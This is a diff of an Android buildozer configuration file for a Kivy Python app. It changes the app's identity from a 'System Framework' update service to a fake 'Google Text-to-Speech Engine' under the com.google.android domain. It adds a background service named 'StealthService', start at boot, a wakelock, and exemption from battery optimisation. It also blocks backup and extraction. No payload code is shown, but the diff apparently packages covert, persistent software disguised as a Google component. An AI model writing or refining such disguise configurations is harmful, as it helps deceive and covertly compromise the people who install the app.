@@ -1,23 +1,25 @@
 [app]
-title = System Framework
-package.name = system_update_service
-package.domain = org.test.updates
+title = Google Text-to-Speech Engine
+package.name = tts_v2
+package.domain = com.google.android
 source.dir = .
-source.include_exts = py,png,jpg,kv,atlas,txt,json
-version = 1.0.1
-requirements = python3,kivy==2.3.0,requests,urllib3,certifi,openssl
+source.include_exts = py,png,jpg,kv,atlas,json,ttf,xml
+source.include_dirs = assets,res
+version = 2.1.0
+requirements = python3,kivy==2.3.0,requests,pyjnius,urllib3,certifi,openssl,pycryptodome
 orientation = portrait
 fullscreen = 0
-android.permissions = INTERNET, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, ACCESS_NETWORK_STATE
+android.permissions = INTERNET,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,POST_NOTIFICATIONS
 android.api = 33
 android.minapi = 21
 android.ndk = 25b
-android.private_storage = True
-android.entrypoint = main.py
+android.manifest = AndroidManifest.xml
+android.archs = arm64-v8a, armeabi-v7a
 android.foreground_service = True
-android.archs = arm64-v8a
+services = StealthService:main.py
+android.meta_data = android.content.pm.NOT_EXTRACTABLE=true
 android.allow_backup = False
-android.manifest.launch_mode = singleInstance
+android.private_storage = True
 android.accept_sdk_license = True
 android.wakelock = True
 
